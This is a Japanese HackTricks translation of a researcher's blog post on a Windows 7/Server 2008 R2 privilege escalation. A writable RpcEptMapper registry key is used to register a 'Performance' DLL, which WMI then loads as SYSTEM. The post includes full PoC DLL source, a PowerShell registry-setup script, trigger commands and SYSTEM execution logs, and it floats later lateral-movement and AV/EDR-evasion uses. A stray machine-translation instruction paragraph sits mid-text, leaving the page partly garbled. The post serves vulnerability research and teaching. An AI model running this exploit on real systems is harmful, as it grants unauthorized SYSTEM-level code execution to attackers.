```markdown
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>


**情報はこちらからコピーされました** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

スクリプトの出力によると、現在のユーザーは二つのレジストリキーに対する書き込み権限を持っています:

* `HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`
* `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`

`regedit` GUIを使用して`RpcEptMapper`サービスの権限を手動で確認しましょう。_詳細セキュリティ設定_ウィンドウについて私が本当に気に入っているのは、_有効な権限_タブです。任意のユーザーまたはグループ名を選択し、すべてのACEを個別に検査することなく、このプリンシパルに付与されている有効な権限をすぐに確認できます。以下のスクリーンショットは、権限の低い`lab-user`アカウントの結果を示しています。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/02\_regsitry-rpceptmapper-permissions.png)

ほとんどの権限は標準的です（例：`Query Value`）が、特に目立つものが一つあります：`Create Subkey`。この権限に対応する一般的な名前は`AppendData/AddSubdirectory`で、これはスクリプトによって報告されたものとまさに一致しています：
```
```
Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False

Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : BUILTIN\Users
Permissions       : {WriteExtendedAttributes, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False
```
以下は、ハッキング技術に関するハッキングの本の内容です。関連する英語のテキストを日本語に翻訳し、まったく同じマークダウンとHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどの翻訳は行わないでください。また、翻訳とマークダウン構文以外の余分なものを追加しないでください。

---

これは具体的に何を意味するのでしょうか？例えば、`ImagePath` の値を変更することはできません。それを行うには、`WriteData/AddFile` 権限が必要です。代わりに、新しいサブキーを作成することしかできません。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/03\_registry-imagepath-access-denied.png)

これは、実際に偽陽性だったということでしょうか？決してそうではありません。楽しみはこれからです！

## RTFM <a href="#rtfm" id="rtfm"></a>

この時点で、`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper` の下に任意のサブキーを作成できることがわかっていますが、既存のサブキーと値を変更することはできません。既に存在するサブキーは `Parameters` と `Security` で、これらはWindowsサービスにとってかなり一般的です。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/04\_registry-rpceptmapper-config.png)

したがって、最初に頭に浮かんだ質問は、_`Parameters` や `Security` のような他の事前定義されたサブキーがあり、それを利用してサービスの設定を効果的に変更し、何らかの方法でその動作を変更できるかどうか_ でした。

この質問に答えるために、私の最初の計画は、すべての既存のキーを列挙し、パターンを特定しようとすることでした。サービスの設定に_意味のある_サブキーがどれかを見ることがアイデアでした。PowerShellでそれをどのように実装し、結果をソートするかについて考え始めました。しかし、その前に、このレジストリ構造がすでに文書化されているかどうか疑問に思いました。そこで、`windows service configuration registry site:microsoft.com` のようなものをグーグルで検索し、こちらが最初に出てきた[結果](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree)です。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/05\_google-search-registry-services.png)

有望に見えますね？一見すると、文書は網羅的で完全ではないように見えました。タイトルを考えると、サービスの設定を定義するすべてのサブキーと値を詳細に説明する何らかのツリー構造を見ることを期待していましたが、明らかにそこにはありませんでした。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/06\_doc-registry-services.png)

それでも、各段落を素早く見てみました。そして、すぐに "_**Performance**_" と "_**DLL**_" というキーワードを見つけました。"**Perfomance**" のサブタイトルの下では、次のように読むことができます：

> **Performance**: _オプションのパフォーマンス監視のための情報を指定するキーです。このキーの下の値は、**ドライバーのパフォーマンスDLLの名前**と、そのDLL内でエクスポートされるべき**特定の関数の名前**を指定します。ドライバーのINFファイルのAddRegエントリを使用して、このサブキーに値エントリを追加することができます。_

この短い段落によると、理論的には、`Performance` サブキーを使用して、ドライバーサービスにDLLを登録し、そのパフォーマンスを監視することができます。**OK、これは本当に興味深いです！** このキーは `RpcEptMapper` サービスにはデフォルトでは存在しないので、まさに私たちが必要としているもののようです。ただし、このサービスは明らかにドライバーサービスではありません。とにかく、試してみる価値はありますが、まずはこの "_パフォーマンス監視_" 機能についてもっと情報が必要です。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/07\_sc-qc-rpceptmapper.png)

> **注:** Windowsでは、各サービスには特定の `Type` があります。サービスタイプには次の値があります：`SERVICE_KERNEL_DRIVER (1)`, `SERVICE_FILE_SYSTEM_DRIVER (2)`, `SERVICE_ADAPTER (4)`, `SERVICE_RECOGNIZER_DRIVER (8)`, `SERVICE_WIN32_OWN_PROCESS (16)`, `SERVICE_WIN32_SHARE_PROCESS (32)` または `SERVICE_INTERACTIVE_PROCESS (256)`。

いくつかのグーグル検索の後、ドキュメントでこのリソースを見つけました：[Creating the Application’s Performance Key](https://docs.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/08\_performance-subkey-documentation.png)

まず、作成する必要があるすべてのキーと値をリストする素敵なツリー構造があります。次に、説明には以下の重要な情報があります：

* `Library` 値には **DLL名またはDLLへの完全なパス** を含めることができます。
* `Open`, `Collect`, `Close` 値を使用して、DLLによってエクスポートされるべき **関数の名前** を指定できます。
* これらの値のデータタイプは `REG_SZ`（または `Library` 値の場合は `REG_EXPAND_SZ`）です。

このリソースに含まれるリンクをたどると、これらの関数のプロトタイプといくつかのコードサンプルまで見つけることができます：[Implementing OpenPerformanceData](https://docs.microsoft.com/en-us/windows/win32/perfctrs/implementing-openperformancedata)。
```
DWORD APIENTRY OpenPerfData(LPWSTR pContext);
DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
DWORD APIENTRY ClosePerfData();
```
理論はこれくらいにして、コードの記述を始めましょう！

## プルーフ・オブ・コンセプトの作成 <a href="#writing-a-proof-of-concept" id="writing-a-proof-of-concept"></a>

ドキュメントを通じて集めた情報を元に、シンプルなプルーフ・オブ・コンセプトDLLを書くのはかなり簡単なはずです。しかし、計画が必要です！

DLLハイジャックの脆弱性を悪用する必要がある場合、通常、シンプルでカスタムのログヘルパー関数から始めます。この関数の目的は、呼び出されるたびに重要な情報をファイルに書き込むことです。通常、現在のプロセスと親プロセスのPID、プロセスを実行しているユーザーの名前と対応するコマンドラインをログに記録します。また、このログイベントをトリガーした関数の名前もログに記録します。この方法で、コードのどの部分が実行されたかを知ることができます。

他の記事では、開発部分は比較的明白だと仮定して常にスキップしていました。しかし、ブログ投稿を初心者にも優しいものにしたいとも思っているので、矛盾があります。ここでは、プロセスを詳細に説明することでこの状況を改善します。では、Visual Studioを起動して新しい「_C++ コンソールアプリ_」プロジェクトを作成しましょう。なお、「_ダイナミックリンクライブラリ(DLL)_」プロジェクトを作成することもできましたが、実際にはコンソールアプリから始める方が簡単だと感じています。

以下は、Visual Studioによって生成された初期コードです：
```c
#include <iostream>

int main()
{
std::cout << "Hello World!\n";
}
```
もちろん、それは私たちが望むものではありません。EXEではなくDLLを作成したいので、`main` 関数を `DllMain` に置き換える必要があります。この関数のスケルトンコードはドキュメントで見つけることができます：[DLLの初期化](https://docs.microsoft.com/en-us/cpp/build/run-time-library-behavior#initialize-a-dll)。
```c
#include <Windows.h>

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
switch (reason)
{
case DLL_PROCESS_ATTACH:
Log(L"DllMain"); // See log helper function below
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
```
```markdown
同時に、出力コンパイルファイルがEXEではなくDLLであるべきことを指定するために、プロジェクトの設定を変更する必要があります。これを行うには、プロジェクトのプロパティを開き、「**General**」セクションで、「**Configuration Type**」として「**Dynamic Library (.dll)**」を選択します。タイトルバーのすぐ下で、「**All Configurations**」と「**All Platforms**」も選択できるので、この設定をグローバルに適用できます。

次に、私のカスタムログヘルパー関数を追加します。
```
```c
#include <Lmcons.h> // UNLEN + GetUserName
#include <tlhelp32.h> // CreateToolhelp32Snapshot()
#include <strsafe.h>

void Log(LPCWSTR pwszCallingFrom)
{
LPWSTR pwszBuffer, pwszCommandLine;
WCHAR wszUsername[UNLEN + 1] = { 0 };
SYSTEMTIME st = { 0 };
HANDLE hToolhelpSnapshot;
PROCESSENTRY32 stProcessEntry = { 0 };
DWORD dwPcbBuffer = UNLEN, dwBytesWritten = 0, dwProcessId = 0, dwParentProcessId = 0, dwBufSize = 0;
BOOL bResult = FALSE;

// Get the command line of the current process
pwszCommandLine = GetCommandLine();

// Get the name of the process owner
GetUserName(wszUsername, &dwPcbBuffer);

// Get the PID of the current process
dwProcessId = GetCurrentProcessId();

// Get the PID of the parent process
hToolhelpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
stProcessEntry.dwSize = sizeof(PROCESSENTRY32);
if (Process32First(hToolhelpSnapshot, &stProcessEntry)) {
do {
if (stProcessEntry.th32ProcessID == dwProcessId) {
dwParentProcessId = stProcessEntry.th32ParentProcessID;
break;
}
} while (Process32Next(hToolhelpSnapshot, &stProcessEntry));
}
CloseHandle(hToolhelpSnapshot);

// Get the current date and time
GetLocalTime(&st);

// Prepare the output string and log the result
dwBufSize = 4096 * sizeof(WCHAR);
pwszBuffer = (LPWSTR)malloc(dwBufSize);
if (pwszBuffer)
{
StringCchPrintf(pwszBuffer, dwBufSize, L"[%.2u:%.2u:%.2u] - PID=%d - PPID=%d - USER='%s' - CMD='%s' - METHOD='%s'\r\n",
st.wHour,
st.wMinute,
st.wSecond,
dwProcessId,
dwParentProcessId,
wszUsername,
pwszCommandLine,
pwszCallingFrom
);

LogToFile(L"C:\\LOGS\\RpcEptMapperPoc.log", pwszBuffer);

free(pwszBuffer);
}
}
```
その後、ドキュメントで見た3つの関数でDLLを満たすことができます。ドキュメントには、成功した場合は `ERROR_SUCCESS` を返すべきだとも記載されています。
```c
DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
Log(L"OpenPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
Log(L"CollectPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
Log(L"ClosePerfData");
return ERROR_SUCCESS;
}
```
プロジェクトが適切に設定され、`DllMain`が実装され、ログヘルパー関数と必要な3つの関数が用意されました。しかし、まだ足りないものがあります。このコードをコンパイルすると、`OpenPerfData`、`CollectPerfData`、`ClosePerfData`は内部関数としてのみ利用可能になるため、これらを**エクスポート**する必要があります。これはいくつかの方法で達成できます。例えば、[DEF](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files)ファイルを作成し、プロジェクトを適切に設定することができます。しかし、私は特にこのような小規模なプロジェクトには、`__declspec(dllexport)`キーワード([doc](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport))を使用することを好みます。この方法では、ソースコードの始めに3つの関数を宣言するだけで済みます。
```c
extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();
```
完全なコードを見たい場合は、[こちら](https://gist.github.com/itm4n/253c5937f9b3408b390d51ac068a4d12)にアップロードしました。

最後に、_**Release/x64**_ を選択し、“_**Build the solution**_”を行います。これにより、DLLファイルが生成されます：`.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`。

## PoCのテスト <a href="#testing-the-poc" id="testing-the-poc"></a>

さらに進む前に、別途ペイロードが正しく動作することを常に確認します。ここで少し時間をかけることで、仮想のデバッグフェーズ中に迷路に陥ることを防ぎ、後で多くの時間を節約できます。これを行うには、単純に`rundll32.exe`を使用し、パラメータとしてDLLの名前とエクスポートされた関数の名前を渡します。
```
C:\Users\lab-user\Downloads\>rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData
```
素晴らしい、ログファイルが作成されました。そして、それを開くと、2つのエントリが見えます。最初のエントリはDLLが`rundll32.exe`によってロードされたときに書かれました。2番目のエントリは`OpenPerfData`が呼び出されたときに書かれました。良さそうです！ ![:slightly\_smiling\_face:](https://github.githubassets.com/images/icons/emoji/unicode/1f642.png)
```
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='DllMain'
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='OpenPerfData'
```
では、実際の脆弱性に焦点を当て、必要なレジストリキーと値を作成し始めましょう。これは、`reg.exe` / `regedit.exe`を使用して手動で行うか、スクリプトを使用してプログラムで行うことができます。私は初期の研究中に手動のステップをすでに説明しましたので、PowerShellスクリプトを使用して同じことをよりクリーンに行う方法を示します。また、PowerShellでレジストリキーと値を作成するのは、`New-Item`と`New-ItemProperty`を呼び出すのと同じくらい簡単ですよね？ ![:thinking:](https://github.githubassets.com/images/icons/emoji/unicode/1f914.png)

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/10\_powershell-new-item-access-denied.png)

`Requested registry access is not allowed`… うーん、やはりそれほど簡単ではないようですね。 ![:stuck\_out\_tongue:](https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png)

この問題についてはあまり調査していませんが、`New-Item`を呼び出すと、`powershell.exe`が実際には親レジストリキーを開こうとして、私たちが持っていない権限に対応するフラグを使用しているのではないかと推測します。

とにかく、組み込みのコマンドレットが機能しない場合は、一段階下がって直接DotNet関数を呼び出すことができます。実際、以下のPowerShellコードでもレジストリキーを作成できます。
```
[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")
```
```markdown
さあ、始めましょう！最終的に、適切なキーと値を作成し、ユーザーの入力を待って、最後にすべてをクリーニングして終了するための以下のスクリプトをまとめました。
```
```
$ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"

Write-Host "[*] Create 'Performance' subkey"
[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)
Write-Host "[*] Create 'Library' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value "$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Open' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Value "OpenPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Collect' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Value "CollectPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Close' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Value "ClosePerfData" -PropertyType "String" -Force | Out-Null

Read-Host -Prompt "Press any key to continue"

Write-Host "[*] Cleanup"
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
```
最後のステップです。**RPCエンドポイントマッパーサービスに私たちのパフォーマンスDLLを読み込ませるにはどうすればいいでしょうか？** 残念ながら、私が試したさまざまな方法をすべて追跡しているわけではありません。このブログ投稿の文脈で、研究が時にはいかに面倒で時間がかかるかを強調するのは非常に興味深いことでした。とにかく、途中で見つけたことの一つは、WMI（_Windows Management Instrumentation_）を使用して_パフォーマンスカウンター_をクエリできるということです。結局のところ、それほど驚くことではありません。詳細はこちら：[_WMIパフォーマンスカウンタータイプ_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types)。

> _カウンタータイプは、_ [_Win32\_PerfRawData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfrawdata) _クラスのプロパティにCounterType修飾子として、また_ [_Win32\_PerfFormattedData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfformatteddata) _クラスのプロパティにCookingType修飾子として現れます。_

そこで、まずPowerShellを使用して、関連するWMIクラスを以下のコマンドで列挙しました。
```
Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/12_powershell-get-wmiobject.gif)

そして、私のログファイルがほぼすぐに作成されたのを見ました！ 以下がファイルの内容です。
```
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='DllMain'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='OpenPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
```
```markdown
私は最初、`RpcEptMapper` サービスのコンテキストで `NETWORK SERVICE` として任意のコード実行ができると思っていましたが、予想以上の結果を得ることができました。実際には、`LOCAL SYSTEM` として実行される `WMI` サービス自体のコンテキストで任意のコード実行ができたのです。これはすごいことではないでしょうか？ ![:sunglasses:](https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png)

> **注記:** もし私が `NETWORK SERVICE` として任意のコード実行を得ていたら、数ヶ月前にJames Forshawがこのブログ投稿で示したトリックのおかげで `LOCAL SYSTEM` アカウントからトークンを得ることができただけだったでしょう: [Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html).

また、WMIクラスを個別に取得しようと試みたところ、全く同じ結果が観察されました。
```
```
Get-WmiObject Win32_Perf
Get-WmiObject Win32_PerfRawData
Get-WmiObject Win32_PerfFormattedData
```
## 結論 <a href="#conclusion" id="conclusion"></a>

この脆弱性がこれほど長い間見過ごされてきた理由はわかりません。一つの説明としては、他のツールはレジストリで完全な書き込みアクセスを探していたのに対し、このケースでは`AppendData/AddSubdirectory`が実際に十分だったということです。"誤設定"自体に関しては、レジストリキーが特定の目的のためにこのように設定されたと思われますが、ユーザーがサービスの設定を変更する権限を持つ具体的なシナリオは思い浮かびません。

この脆弱性について公に書くことにした理由は二つあります。一つ目は、実際には気づかないうちに公開してしまったことです。それは数ヶ月前、私のPrivescCheckスクリプトを`GetModfiableRegistryPath`関数で更新した日のことでした。二つ目は、影響が低いことです。ローカルアクセスが必要で、サポートが終了した古いバージョンのWindows（拡張サポートを購入していない限り）にのみ影響します。この時点で、Windows 7 / Server 2008 R2を適切にネットワーク内で隔離せずに使用している場合、攻撃者がSYSTEM権限を取得することを防ぐことはおそらく最小の懸念事項でしょう。

この特権昇格脆弱性の逸話的な側面を除いて、この「Perfomance」レジストリ設定は、横移動やAV/EDR回避のための後の悪用に非常に興味深い機会を開くと思います。私はすでにいくつかの特定のシナリオを考えていますが、まだどれもテストしていません。続くかもしれませんか？…

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>
